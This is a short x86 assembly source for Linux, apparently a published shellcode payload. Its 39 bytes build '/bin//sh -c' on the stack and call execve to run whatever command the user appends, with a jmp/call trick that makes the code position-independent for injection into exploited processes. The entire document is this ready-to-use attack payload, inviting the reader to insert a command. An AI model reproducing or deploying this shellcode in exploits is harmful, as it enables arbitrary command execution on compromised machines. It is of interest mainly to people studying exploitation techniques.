

; 39 byte execute command for linux/x86
; odzhan

    bits    32
start:
    xor     eax, eax
    cdq                        ; penv=0
    push    eax                ; '\0'
    push    0x68732f2f	       ; "//sh"
    push    0x6e69622f	       ; "/bin"
    mov     ebx, esp           ; ebx="/bin//sh", 0
    push    eax                ; 0
    push    word 0x632d        ; "-c"
    mov     edi, esp           ; edi="-c", 0
    push    eax                ; NULL
    jmp     l_cmd
r_cmd:                         ; command
    push    edi                ; "-c", 0
    push    ebx                ; "/bin//sh", 0
    mov     ecx, esp           ; ecx=argv"
    mov     al, 11             ; eax=sys_execve
    int     0x80
l_cmd:
    call   r_cmd
    ; put your command here followed by null terminator